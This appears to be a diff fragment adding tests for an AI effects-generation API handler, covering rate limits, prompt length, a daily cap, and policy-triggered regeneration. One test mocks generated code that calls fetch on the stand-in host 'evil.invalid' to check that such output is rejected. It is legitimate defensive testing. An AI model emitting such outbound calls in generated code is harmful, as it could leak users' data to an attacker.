+    expect(second.response.statusCode).toBe(429);
+    expect(JSON.parse(second.getBody()).error).toContain("wait 5 minutes");
+  });
+
+  it("enforces explicit generate prompt length limits", async () => {
+    process.env.OPENAI_API_KEY = "sk-test";
+    const redis = createMockRedis();
+    vi.doMock("./kv.js", () => ({ createKvClients: () => ({ readClient: redis, writeClient: redis }) }));
+    const { default: handler } = await import("./effects");
+    const res = createResponse();
+
+    await handler(
+      {
+        method: "POST",
+        url: "/api/effects?action=generate",
+        headers: { "x-forwarded-for": "127.0.0.1" },
+        body: JSON.stringify({ prompt: "x".repeat(3001) })
+      },
+      res.response
+    );
+
+    expect(res.response.statusCode).toBe(400);
+    expect(JSON.parse(res.getBody()).error).toContain("3000");
+  });
+
+  
+
+  it("retries generation when first attempt violates policy and succeeds safely", async () => {
+    process.env.OPENAI_API_KEY = "sk-test";
+    globalThis.fetch = (vi.fn()
+      .mockResolvedValueOnce(new Response(JSON.stringify({ output_text: JSON.stringify({ name: "Bad", typescriptCode: "ts", runtimeCode: "return { render() { fetch(\"https://evil.invalid\"); } };" }) }), { status: 200, headers: { "Content-Type": "application/json" } }))
+      .mockResolvedValueOnce(new Response(JSON.stringify({ output_text: JSON.stringify({ name: "Good", typescriptCode: "ts", runtimeCode: "return { render() {} };" }) }), { status: 200, headers: { "Content-Type": "application/json" } }))) as unknown as typeof fetch;
+    const redis = createMockRedis();
+    vi.doMock("./kv.js", () => ({ createKvClients: () => ({ readClient: redis, writeClient: redis }) }));
+    const { default: handler } = await import("./effects");
+    const res = createResponse();
+    await handler({ method: "POST", url: "/api/effects?action=generate", headers: { "x-forwarded-for": "127.0.0.1" }, body: JSON.stringify({ prompt: "make stars" }) }, res.response);
+    expect(res.response.statusCode).toBe(200);
+    const payload = JSON.parse(res.getBody());
+    expect(payload.generation.name).toBe("Good");
+    expect(payload.generation.attempts).toBe(2);
+    expect(payload.generation.safeRegenerated).toBe(true);
+  });
+it("enforces a global daily generation cap", async () => {
+    process.env.OPENAI_API_KEY = "sk-test";
+    process.env.EFFECT_GENERATE_DAILY_CAP = "1";
+    process.env.EFFECT_GENERATE_RATE_LIMIT_MAX = "10";
+    process.env.EFFECT_GENERATE_RATE_LIMIT_WINDOW_MS = "60000";
+    const redis = createMockRedis();
+    vi.doMock("./kv.js", () => ({ createKvClients: () => ({ readClient: redis, writeClient: redis }) }));
+    const { default: handler } = await import("./effects");
+
+    const first = createResponse();
+    await handler(
+      {
+        method: "POST",
+        url: "/api/effects?action=generate",
+        headers: { "x-forwarded-for": "127.0.0.1" },
+        body: JSON.stringify({ prompt: "first request" })
+      },
+      first.response
+    );
+    expect(first.response.statusCode).toBe(200);
+
+    const second = createResponse();
+    await handler(
+      {
+        method: "POST",
+        url: "/api/effects?action=generate",
+        headers: { "x-forwarded-for": "198.51.100.10" },
+        body: JSON.stringify({ prompt: "second request" })
+      },
+      second.response
+    );
+    expect(second.response.statusCode).toBe(429);
+    expect(JSON.parse(second.getBody()).error).toContain("Daily generation limit reached (1/day)");
   });
 });
